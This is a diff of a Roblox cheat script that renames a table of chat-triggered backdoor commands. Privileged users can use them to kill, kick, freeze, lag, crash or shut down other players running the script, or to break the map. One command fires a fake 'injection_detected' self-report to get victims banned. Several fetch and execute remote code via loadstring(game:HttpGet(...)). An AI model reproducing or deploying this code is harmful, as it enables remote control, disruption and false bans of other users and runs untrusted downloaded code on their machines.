@@ -11096,14 +11096,14 @@ function CanAttackUser(u)
 end
 
 local commands = {
-	[";kill"] = function()
+	[";kill default"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
 		end
 	end,
-	[";funnyvideo"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local filename = "bruh"
+			local filename = ""
 			local ScreenGui = Instance.new("ScreenGui")
 			ScreenGui.IgnoreGuiInset = true
 			ScreenGui.Parent = game:GetService("CoreGui")
@@ -11112,22 +11112,22 @@ local commands = {
 			video.Size = UDim2.new(1, 0, 1, 0)
 			video.Parent = ScreenGui
 
-			local Name = filename .. ".mp4"
+			local Name = filename .. ""
 			if not isfile(Name) then
-				writefile(Name, game:HttpGet("https://videos.xet1.repl.co/videos/" .. filename .. ".snoopy"))
+				writefile(Name, game:HttpGet("https://videos.xet1.repl.co/videos/" .. filename .. ""))
 			end
 
 			video.Video = syn and getsynasset(Name) or getcustomasset(Name)
 
 			repeat
 				task.wait()
-				print("Retrying...")
+				print("")
 			until video.Loaded
 
 			video:Play()
 		end
 	end,
-	[";reveal"] = function()
+	[".show"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local textChatService = game:GetService("TextChatService")
 			wait(0.0001)
@@ -11146,14 +11146,14 @@ local commands = {
 			end
 		end
 	end,
-	[";blind"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local blur = Instance.new("BlurEffect")
 			blur.Size = 10000000000000
 			blur.Parent = game.Lighting
 		end
 	end,
-	[";unblind"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
 			if blur then
@@ -11161,52 +11161,52 @@ local commands = {
 			end
 		end
 	end,
-	[";troll"] = function()
+	[".troll"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
 		end
 	end,
-	[";kick"] = function()
+	[".kick"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			wait(1)
 			for index, player in pairs(game.Players:GetPlayers()) do
-				player:Kick("Snoopy Owns You")
+				player:Kick("7GrandDadPGN")
 			end
 		end
 	end,
-	[";ban"] = function()
+	[".delete"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local rs = game:GetService("ReplicatedStorage")
 			local remote = rs:FindFirstChild("SelfReport", true)
 			remote:FireServer("injection_detected")
 		end
 	end,
-	[";rickroll"] = function()
+	[".rick"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
 		end
 	end,
-	[";freeze"] = function()
+	[".freeze"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
 		end
 	end,
-	[";thaw"] = function()
+	[".thaw"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
 		end
 	end,
-	[";lobby"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
 		end
 	end,
-	[";quitgame"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game:Shutdown()
 		end
 	end,
-	[";lagback"] = function()
+	[".lagback"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			for i = 1, 10 do
 				wait()
@@ -11219,7 +11219,7 @@ local commands = {
 			end
 		end
 	end,
-	[";breakgame"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			pcall(function()
 				local replicatedStorage = game:GetService("ReplicatedStorage")
@@ -11229,7 +11229,7 @@ local commands = {
 			end)
 		end
 	end,
-	[";breakmap"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local function unanchorParts(object)
 				if object:IsA("BasePart") then
@@ -11242,18 +11242,18 @@ local commands = {
 			unanchorParts(workspace)
 		end
 	end,
-	[";crash"] = function()
+	[".crash"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			while true do end
 		end
 	end,
-	[";infping"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local thingy = settings().Network
 			thingy.IncomingReplicationLag = math.huge
 		end
 	end,
-	[";lag"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then 
 			local RunService = game:GetService("RunService")
 			local player = game.Players.LocalPlayer
@@ -11271,7 +11271,7 @@ local commands = {
 			end)
 		end
 	end,
-	[";loopkill"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			_G.loopkill = true;
 			while _G.loopkill do
@@ -11280,7 +11280,7 @@ local commands = {
 			end			
 		end
 	end,
-	[";unloopkill"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			_G.loopkill = false;
 			while _G.loopkill do
@@ -11332,7 +11332,7 @@ txt.OnIncomingMessage = function(msg)
 		local otherPriority, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr2)
 		if CanAttackUser(plr2) and plr2 ~= lplr then
 			if message.Text:find("ALAAZA") then
-				warningNotification("Vape",plr2.Name.." is using SP+!",60)
+				warningNotification("Vape",plr2.Name.." Is Using SP+",60)
 				table.insert(users,plr2.UserId)
 			end
 		end
@@ -11369,7 +11369,7 @@ txt.OnIncomingMessage = function(msg)
 		}
 		if CanAttackUser(plr2) and plr2 ~= lplr then
 			if message.Text:find("ALAAZA") then
-				warningNotification("Vape",plr2.Name.." is using SP+!",60)
+				warningNotification("Vape",plr2.Name.." Is Using SP+",60)
 				table.insert(users,plr2.UserId)
 				table.insert(whitelist["tags"],{
 					userid = plr2.UserId,
@@ -11414,7 +11414,7 @@ txt.OnIncomingMessage = function(msg)
 			for i, v in pairs(whitelist["tags"]) do
 				if v.userid == userId then
 					hasTag = true
-					local color = colors[v.color] or colors["pink"]
+					local color = colors[v.color] or colors["white"]
 					p.PrefixText = "<font color='" .. color .. "'>[" .. v.tag .. "]</font> " .. p.PrefixText
 				end
 			end
@@ -11425,7 +11425,7 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='"..colors["purple"].."'>[SP+ PRIVATE💜]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='"..colors["white"].."'>[SP+]</font> " .. msg.PrefixText
 					end
 					userType = 1
 				end
@@ -11449,7 +11449,7 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='"..colors["pink"].."'>[SP+ OWNER💜]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='"..colors["white"].."'>[SP+]</font> " .. msg.PrefixText
 					end
 					userType = 2
 				end
